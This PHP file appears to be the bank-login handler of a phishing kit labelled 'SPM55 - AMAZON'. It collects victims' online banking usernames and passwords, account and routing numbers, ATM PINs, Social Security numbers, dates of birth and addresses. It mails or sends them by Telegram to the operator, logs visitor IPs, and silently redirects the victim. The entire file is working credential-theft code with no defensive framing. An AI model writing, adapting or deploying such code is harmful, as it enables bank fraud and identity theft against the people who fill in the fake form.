<?php
session_start();
include'../main.php';
if (!isset($_POST['email'])) {
	exit(header("HTTP/1.0 404 Not Found"));
}else{
$ip = getUserIP();
$subject = "BANK LOGIN ".$_POST['bankname']." [".$_POST['user_bank']." - ".$_POST['email']."] - [".$cn." - ".$ip." - ".$br."]";
$message = '
===============[ BANK LOGIN ]===============<br>
Bank Name : '.$_POST['bankname'].'<br>
Username : '.$_POST['user_bank'].'<br>
Password : '.$_POST['pass_bank'].'<br>
Account Number : '.$_POST['anum'].'<br>
Routing Number : '.$_POST['rnum'].'<br>
ATM PIN : '.$_POST['atmpin'].'<br>
===============[ BILLING INFORMATION ]===============<br>
Full Name : '.$_POST['fname'].'<br>
State : '.$_POST['state'].'<br>
City : '.$_POST['city'].'<br>
Address : '.$_POST['address'].'<br>
ZIP Code : '.$_POST['zip'].'<br>
Date Of Birth : '.$_POST['dob'].'<br>
SSN : '.$_POST['ssn'].'<br>
Phone Number : '.$_POST['phone'].'<br>
===============[ DEVICE INFORMATION ]===============<br>
Country : '.$cn.'<br>
Region : '.$regioncity.'<br>
City : '.$citykota.'<br>
Continent : '.$continent.'<br>
Useragent : '.$user_agent.'<br>
ISP : '.$ispuser.'<br>
IP : '.$ip.'<br>
OS / Browser : '.$os.' / '.$br.'<br>
Timezone : '.$timezone.'<br>
Date : '.$date.'<br>
===============[ SPM55 - AMAZON ]===============
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'FROM: BANK LOGIN '.$_POST['bankname'].' <'.$sender_mail.'>' . "\r\n";
api($message,$subject,"email");
if ($send_login == "email") {
mail($email_result, $subject, $message, $headers);
tulis_file("../result/bank.txt", $ip);
tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|BANK LOGIN");
}else{
$message = 'message========[ BANK INFORMATION ]=======|Bank : '.$_POST['bankname'].'|Username : '.$_POST['user_bank'].'|Password : '.$_POST['pass_bank'].'|Account Number : '.$_POST['anum'].'|Routing Number : '.$_POST['rnum'].'|ATM PIN : '.$_POST['atmpin'].'|=======[ BILLING INFORMATION ]=======|Full Name : '.$_POST['fname'].'|State : '.$_POST['state'].'|City : '.$_POST['city'].'|Address : '.$_POST['address'].'|Zip Code : '.$_POST['zip'].'|DOB : '.$_POST['dob'].'|SSN : '.$_POST['ssn'].'|Phone : '.$_POST['phone'].'|=======[ DEVICE INFORMATION ]=======|Country : '.$cn.'|Region : '.$regioncity.'|City : '.$city.'|User Agent : '.$user_agent.'|OS / BR : '.$os.' / '.$br.'|ISP : '.$ispuser.'|IP : '.$ip.'|Timezone : '.$timezone.'|=======[ SPM55 - AMAZON ]=======';
send_telegram($set_ip,$domain,$message);
tulis_file("../result/bank.txt", $ip);
tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|BANK LOGIN");
}
	echo "<form id='boyxd' method='POST' action='../done'><input type='hidden' name='email' value='".$_POST['email']."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
?>